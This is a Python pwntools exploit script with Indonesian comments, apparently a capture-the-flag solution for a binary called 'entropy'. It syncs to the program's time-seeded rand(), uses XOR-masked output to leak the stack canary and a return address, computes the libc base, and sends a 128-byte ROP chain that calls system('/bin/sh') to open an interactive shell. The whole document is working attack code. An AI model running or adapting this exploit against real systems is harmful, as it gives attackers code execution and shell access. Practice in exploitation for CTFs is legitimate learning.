from pwn import *
import ctypes
import time

context.binary = elf = ELF('./entropy')
context.log_level = 'info'

libc = ELF('./libc6_2.42-0ubuntu3_amd64.so', checksec=False) 
libc_rand = ctypes.CDLL(libc.path)

OFFSET_LEAK_TO_BASE = 0x2a575

# GANTI DENGAN IP & PORT INSTANCE YANG AKTIF
p = process('./entropy') 
# p = process('./entropy') # Gunakan ini untuk tes lokal terlebih dahulu!

# --- 1. SYNC SEED ---
log.info("Syncing seed time...")
p.sendline(b'72') 
server_rand = int(p.recvline().strip())

valid_seed = None
now = int(time.time())
for delta in range(-60, 61):
    test_seed = now + delta
    libc_rand.srand(test_seed)
    if (libc_rand.rand() & 0xff) == server_rand:
        valid_seed = test_seed
        log.success(f"Seed matched! Delta: {delta} seconds")
        break

if valid_seed is None:
    log.failure("Failed to sync seed.")
    exit(0)

libc_rand.srand(valid_seed)
libc_rand.rand() 

def leak_byte(offset):
    p.sendline(str(offset).encode())
    line = p.recvline().strip()
    val = int(line)
    r = libc_rand.rand() & 0xff
    return val ^ r

# --- 2. LEAK CANARY & RET ADDR ---
canary = b'\x00' 
for i in range(73, 80):
    canary += p8(leak_byte(i))
canary = u64(canary)
log.success(f"Canary: {hex(canary)}")

ret_addr = b''
for i in range(104, 112):
    ret_addr += p8(leak_byte(i))
ret_addr = u64(ret_addr)
log.success(f"Leaked RetAddr: {hex(ret_addr)}")

# --- 3. HITUNG BASE & CARI GADGET SECARA OTOMATIS ---
libc.address = ret_addr - OFFSET_LEAK_TO_BASE
log.success(f"Libc Base: {hex(libc.address)}")

# Pwntools akan otomatis mencari gadget "pop rdi; ret" yang murni
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
bin_sh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']

log.info(f"pop rdi: {hex(pop_rdi)}")
log.info(f"system: {hex(system)}")
log.info(f"/bin/sh: {hex(bin_sh)}")

# --- 4. PAYLOAD (TOTAL 128 BYTE) ---
payload = b'A' * 72
payload += p64(canary)
payload += b'B' * 8    # Gap 8 byte
payload += p64(0)      # Saved RBX
payload += p64(0)      # Saved RBP (Dibuat 0 agar rsp 16-byte aligned saat masuk system)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

assert len(payload) == 128, f"Panjang payload {len(payload)} bukan 128!"

p.sendline(payload)
p.interactive()